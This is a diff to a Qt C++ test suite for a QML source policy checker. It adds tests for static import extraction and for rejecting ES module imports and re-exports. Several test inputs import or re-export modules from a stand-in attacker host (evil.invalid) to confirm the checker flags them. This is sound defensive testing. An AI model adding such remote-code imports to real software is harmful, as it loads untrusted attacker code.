@@ -15,6 +15,8 @@ private slots:
     void classifiesEveryQmlAndScriptExtensionCaseInsensitively();
     void requiresSourceBindingsToBeOneStaticSafeLiteral();
     void rejectsSetSourceAndComputedMembersForAnyLoaderId();
+    void extractsStaticModuleImportsWithoutLexicalFalsePositives();
+    void classifiesEsModuleImportsAndRejectsRemoteSpecifiers();
 };
 
 void QmlSourcePolicyTest::rejectsDynamicConstructionLoadingAndImports()
@@ -102,6 +104,78 @@ Item {
     const QStringList violations = QmlSourcePolicy::violations(source);
     QVERIFY(violations.contains(QStringLiteral("loader-set-source")));
     QVERIFY(violations.contains(QStringLiteral("loader-dynamic-member")));
+}
+
+void QmlSourcePolicyTest::extractsStaticModuleImportsWithoutLexicalFalsePositives()
+{
+    const QByteArray source = R"QML(
+// import Attacker.Comment
+import QtQuick 2.15 as QQ
+import QtQuick.Controls as Controls
+import "pages" as Pages
+.import QtQml 2.15 as Qml
+const documentation = "import Attacker.String 1.0"
+const expression = `import Attacker.Template ${1 + 1}`
+)QML";
+    QCOMPARE(QmlSourcePolicy::staticImports(source),
+             QStringList({QStringLiteral("QtQuick"),
+                          QStringLiteral("QtQuick.Controls"),
+                          QStringLiteral("QtQml")}));
+}
+
+void QmlSourcePolicyTest::classifiesEsModuleImportsAndRejectsRemoteSpecifiers()
+{
+    const QByteArray localModules = R"JS(
+import DefaultExport from "./default.mjs";
+import * as Helpers from "../helpers.mjs";
+import { first, second as alias } from "./named.mjs";
+)JS";
+    QCOMPARE(QmlSourcePolicy::staticImports(localModules), QStringList{});
+    QCOMPARE(QmlSourcePolicy::violations(localModules),
+             QStringList({QStringLiteral("es-module-import")}));
+
+    const QList<QByteArray> remoteModules{
+        QByteArrayLiteral("import DefaultExport from \"https://evil.invalid/a.mjs\";"),
+        QByteArrayLiteral("import * as Helpers from \"https://evil.invalid/b.mjs\";"),
+        QByteArrayLiteral("import { value } from \"https://evil.invalid/c.mjs\";"),
+        QByteArrayLiteral("import \"https://evil.invalid/side-effect.mjs\";"),
+    };
+    for (const QByteArray &source : remoteModules) {
+        QVERIFY2(!QmlSourcePolicy::violations(source).isEmpty(),
+                 source.constData());
+        QCOMPARE(QmlSourcePolicy::staticImports(source), QStringList{});
+    }
+
+    QByteArray longNamedImport = QByteArrayLiteral("import {");
+    for (int index = 0; index < 140; ++index) {
+        if (index != 0) longNamedImport += ',';
+        longNamedImport += QByteArrayLiteral("a") + QByteArray::number(index);
+    }
+    longNamedImport += QByteArrayLiteral(
+        "} from \"https://evil.invalid/long.mjs\";");
+    QVERIFY(QmlSourcePolicy::violations(longNamedImport).contains(
+        QStringLiteral("es-module-import")));
+
+    const QList<QByteArray> combinedImports{
+        QByteArrayLiteral("import QtQuick, { x } from \"./x.mjs\";"),
+        QByteArrayLiteral("import QtQuick, * as X from \"./x.mjs\";"),
+    };
+    for (const QByteArray &source : combinedImports) {
+        QVERIFY(QmlSourcePolicy::violations(source).contains(
+            QStringLiteral("es-module-import")));
+        QCOMPARE(QmlSourcePolicy::staticImports(source), QStringList{});
+    }
+
+    const QList<QByteArray> reexports{
+        QByteArrayLiteral("export * from \"./local.mjs\";"),
+        QByteArrayLiteral("export { x, y as z } from \"./local.mjs\";"),
+        QByteArrayLiteral("export * from \"https://evil.invalid/star.mjs\";"),
+        QByteArrayLiteral("export { x } from \"https://evil.invalid/named.mjs\";"),
+    };
+    for (const QByteArray &source : reexports) {
+        QVERIFY(QmlSourcePolicy::violations(source).contains(
+            QStringLiteral("es-module-export")));
+    }
 }
 
 void QmlSourcePolicyTest::ignoresCommentsStringsAndStaticComponents()
